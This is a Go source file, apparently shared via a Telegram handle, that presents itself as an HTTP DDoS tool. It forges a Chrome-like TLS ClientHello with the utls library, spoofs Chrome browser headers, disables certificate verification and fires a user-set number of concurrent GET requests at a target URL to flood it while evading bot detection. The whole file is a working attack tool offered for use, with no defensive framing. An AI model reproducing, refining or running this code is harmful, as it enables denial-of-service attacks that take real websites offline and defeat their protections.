/*
t.me/xxiinn

BASE 0%HTTP-DDOS NEW SIMPEL HANDSHAKE USING TLS-HELLO LIKE GOOGLE CHROME 100% LIKELY HUMAN
*/

package main

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"time"

	utls "github.com/refraction-networking/utls"
)

func buildClientHello(host string) (*tls.Config, *utls.ClientHelloSpec) {

	spec := &utls.ClientHelloSpec{

		TLSVersMin: tls.VersionTLS12,
		TLSVersMax: tls.VersionTLS13,

		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},

		CompressionMethods: []byte{
			0x00,
		},

		Extensions: []utls.TLSExtension{

			&utls.SNIExtension{
				ServerName: host,
			},

			&utls.ALPNExtension{
				AlpnProtocols: []string{
					"h2",
					"http/1.1",
				},
			},

			&utls.SupportedCurvesExtension{
				Curves: []utls.CurveID{
					utls.X25519,
					utls.CurveP256,
				},
			},

			&utls.SupportedPointsExtension{
				SupportedPoints: []byte{
					0,
				},
			},

			&utls.SignatureAlgorithmsExtension{
				SupportedSignatureAlgorithms: []utls.SignatureScheme{
					utls.ECDSAWithP256AndSHA256,
					utls.PSSWithSHA256,
					utls.PKCS1WithSHA256,
				},
			},

			&utls.KeyShareExtension{
				KeyShares: []utls.KeyShare{
					{
						Group: utls.X25519,
					},
				},
			},

			&utls.SupportedVersionsExtension{
				Versions: []uint16{
					tls.VersionTLS13,
					tls.VersionTLS12,
				},
			},
		},
	}

	config := &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}

	return config, spec
}

func sendRequest(target string) {

	parsed, err := url.Parse(target)
	if err != nil {
		return
	}

	host := parsed.Hostname()
	port := parsed.Port()

	if port == "" {
		port = "443"
	}

	addr := host + ":" + port

	tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return
	}

	config, spec := buildClientHello(host)

	uconn := utls.UClient(tcpConn, config, utls.HelloCustom)

	err = uconn.ApplyPreset(spec)
	if err != nil {
		return
	}

	err = uconn.Handshake()
	if err != nil {
		return
	}

	req, _ := http.NewRequest("GET", target, nil)

req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
req.Header.Set("Accept-Language", "en-US,en;q=0.9")
req.Header.Set("Accept-Encoding", "gzip, deflate, br")
req.Header.Set("Cache-Control", "max-age=0")
req.Header.Set("Upgrade-Insecure-Requests", "1")
req.Header.Set("Sec-Ch-Ua", `"Chromium";v="122", "Google Chrome";v="122", "Not:A-Brand";v="99"`)
req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
req.Header.Set("Sec-Fetch-Site", "none")
req.Header.Set("Sec-Fetch-Mode", "navigate")
req.Header.Set("Sec-Fetch-User", "?1")
req.Header.Set("Sec-Fetch-Dest", "document")
req.Header.Set("Connection", "keep-alive")

	err = req.Write(uconn)
	if err != nil {
		return
	}

	buf := make([]byte, 4096)
	uconn.Read(buf)

	uconn.Close()
}

func main() {

	if len(os.Args) != 3 {
		fmt.Println("usage: go run file.go url jumlah_request")
		return
	}

	target := os.Args[1]

	total, err := strconv.Atoi(os.Args[2])
	if err != nil {
		return
	}

	for i := 0; i < total; i++ {

		go sendRequest(target)

	}

	time.Sleep(20 * time.Second)
}